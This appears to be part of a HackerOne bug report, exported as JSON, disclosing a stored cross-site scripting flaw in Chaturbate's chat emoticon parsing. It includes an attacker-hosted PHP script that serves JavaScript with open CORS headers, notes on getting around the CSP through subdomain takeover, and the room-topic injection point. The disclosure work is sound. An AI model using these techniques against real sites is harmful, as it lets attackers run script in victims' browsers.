src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/366/520/5baafe019985e8faf892c2c9328f135f3b31f062/Screen_Shot_2018-10-26_at_16.18.37.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221500Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=8c45b57955e1de2caa662178aa9701b71bd9e4b863be997d9f18935f87f8c350\" class=\"markdown-inline-image\"></a></p>\n\n<p>Contents of <code>xss.php</code>:</p>\n<pre class=\"highlight php\"><code><span class=\"cp\">&lt;?php</span>\n<span class=\"nb\">header</span><span class=\"p\">(</span><span class=\"s1\">&#39;Content-Type: text/javascript&#39;</span><span class=\"p\">);</span>\n<span class=\"nb\">header</span><span class=\"p\">(</span><span class=\"s1\">&#39;Access-Control-Allow-Origin: *&#39;</span><span class=\"p\">);</span>\n<span class=\"nb\">header</span><span class=\"p\">(</span><span class=\"s1\">&#39;Access-Control-Allow-Headers: X-Requested-With, connectUrl, X-CSRFToken&#39;</span><span class=\"p\">);</span>\n<span class=\"cp\">?&gt;</span>\nalert(document.domain);\n</code></pre>\n<h3 id=\"notes\">Notes</h3>\n\n<p><strong>CSP</strong><br>\nThe reason the second XSS issue does not work in CSP enabled browsers is that no domain in my control is allowed by the <code>connect-src</code> directive. However, several <code>*.DOMAIN.COM</code> are included in <code>connect-src</code>:</p>\n<pre class=\"highlight javascript\"><code><span class=\"nx\">https</span><span class=\"p\">:</span><span class=\"c1\">//*.highwebmedia.com</span>\n<span class=\"nl\">https</span><span class=\"p\">:</span><span class=\"c1\">//*.chaturbate.com</span>\n<span class=\"nl\">https</span><span class=\"p\">:</span><span class=\"c1\">//*.hotjar.com:*</span>\n</code></pre>\n<p>This means this issue can be exploited if a <a href=\"/redirect?signature=fdbc8da54844c9862f5b8cd2a2e49154593f6c87&amp;url=https%3A%2F%2Fwww.hacker101.com%2Fvulnerabilities%2Fsubdomain_takeover.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>subdomain takeover</span><i class=\"icon-external-link\"></i></a> bug exists in any of those domains. Obviously I can&#39;t test for that, but it&#39;s an important note regarding impact.</p>\n\n<p><strong>Other exploitation areas</strong><br>\nThe only place where I could find that didn&#39;t respond with a server error when using <code>%%%[emoticon ]%%%</code> was the room topic. However, if there is any other type of message that allows this string, that would be vulnerable as well, since the emoticon parsing functionality is ran on all messages.</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>Stored XSS on chaturbate.com with 2 click interaction.</p>\n\n<p>Exploitation by using an offensive image in <code>EMOTICON_URL</code> using XSS payload in <code>REPORT_URL</code>. It&#39;s also possible to create an emoticon that covers the whole chat window by using a large value in <code>WIDTH</code> and <code>HEIGHT</code>:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2018-10-26_at_16.37.56.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/366/528/faf0aea6215d358c9d42dde3225cea05779c671b/Screen_Shot_2018-10-26_at_16.37.56.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221500Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=a5ad492501cb5576dc541b826f606f2a197d1265819938ab24ed170b12a08b07\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/366/528/faf0aea6215d358c9d42dde3225cea05779c671b/Screen_Shot_2018-10-26_at_16.37.56.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221500Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=a5ad492501cb5576dc541b826f606f2a197d1265819938ab24ed170b12a08b07\" class=\"markdown-inline-image\"></a></p>\n", 
+    "severity_rating": "medium", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://chaturbate.com", 
+            "about": "The largest online adult cam site", 
+            "twitter_handle": "chaturbate", 
+            "name": "Chaturbate"
+        }, 
+        "handle": "chaturbate", 
+        "url": "https://hackerone.com/chaturbate", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/030/475/79ec2a5d5506ca413116cc2a5599d26d97111baf_small.png?1530832762", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/030/475/e53792d73fe8ef3d983f657dd70c4af862f929f0_medium.png?1530832762"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 30475, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
